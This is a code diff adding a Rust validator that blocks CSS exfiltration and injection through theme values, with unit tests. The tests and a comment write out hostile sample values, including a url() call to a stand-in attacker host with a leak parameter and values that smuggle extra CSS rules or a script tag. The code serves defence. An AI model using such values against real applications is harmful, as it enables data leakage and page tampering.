@@ -86,6 +86,22 @@ fn validate_theme_key(key: &str) -> Result<(), String> {
     Ok(())
 }
 
+/// Reject CSS values that could trigger external loads or break out of the
+/// custom-property declaration when consumed via `var(--x)` inside a stylesheet
+/// rule. The frontend pipes these straight to `element.style.setProperty(--name, value)`
+/// (see `src/utils/applyTheme.ts`), so a value like `url("https://attacker/x")`
+/// inside a value later used by `background-image: var(--x)` would exfiltrate.
+fn validate_var_value(value: &str) -> Result<(), String> {
+    let lower = value.to_ascii_lowercase();
+    if lower.contains("url(") {
+        return Err("theme value cannot contain url(...)".into());
+    }
+    if value.contains([';', '{', '}', '<', '>', '\n', '\r']) {
+        return Err("theme value cannot contain ; { } < > or newlines".into());
+    }
+    Ok(())
+}
+
 /// Validate theme data structure.
 fn validate_theme_data(data: &ThemeDef) -> Result<(), String> {
     if data.name.is_empty() || data.name.len() > 100 {
@@ -102,7 +118,12 @@ fn validate_theme_data(data: &ThemeDef) -> Result<(), String> {
                 "variable key/value exceeds {MAX_VAR_VALUE_LEN} characters"
             ));
         }
+        validate_var_value(v)?;
     }
+    validate_var_value(&data.terminal.foreground)?;
+    validate_var_value(&data.terminal.background)?;
+    validate_var_value(&data.terminal.background_inactive)?;
+    validate_var_value(&data.terminal.pane_background)?;
     Ok(())
 }
 
@@ -315,6 +336,65 @@ mod tests {
             variables: HashMap::new(),
             terminal: ThemeTerminal {
                 foreground: "#fff".into(),
+                background: "#000".into(),
+                background_inactive: "#000".into(),
+                pane_background: "#000".into(),
+            },
+        };
+        assert!(validate_theme_data(&theme).is_err());
+    }
+
+    #[test]
+    fn validate_theme_data_rejects_url_in_value() {
+        let theme = ThemeDef {
+            name: "Bad".into(),
+            variables: HashMap::from([(
+                "bg-primary".into(),
+                r#"red url("https://attacker/x?leak=1")"#.into(),
+            )]),
+            terminal: ThemeTerminal {
+                foreground: "#fff".into(),
+                background: "#000".into(),
+                background_inactive: "#000".into(),
+                pane_background: "#000".into(),
+            },
+        };
+        let err = validate_theme_data(&theme).unwrap_err();
+        assert!(err.contains("url"));
+    }
+
+    #[test]
+    fn validate_theme_data_rejects_structural_chars_in_value() {
+        for bad in [
+            "red; background-image: url(x)",
+            "red}body{display:none",
+            "rgb(0,0,0)<script>",
+            "red\nbackground:url(x)",
+        ] {
+            let theme = ThemeDef {
+                name: "Bad".into(),
+                variables: HashMap::from([("bg-primary".into(), bad.into())]),
+                terminal: ThemeTerminal {
+                    foreground: "#fff".into(),
+                    background: "#000".into(),
+                    background_inactive: "#000".into(),
+                    pane_background: "#000".into(),
+                },
+            };
+            assert!(
+                validate_theme_data(&theme).is_err(),
+                "expected rejection of: {bad}"
+            );
+        }
+    }
+
+    #[test]
+    fn validate_theme_data_rejects_url_in_terminal_color() {
+        let theme = ThemeDef {
+            name: "Bad".into(),
+            variables: HashMap::new(),
+            terminal: ThemeTerminal {
+                foreground: r#"url("http://x")"#.into(),
                 background: "#000".into(),
                 background_inactive: "#000".into(),
                 pane_background: "#000".into(),
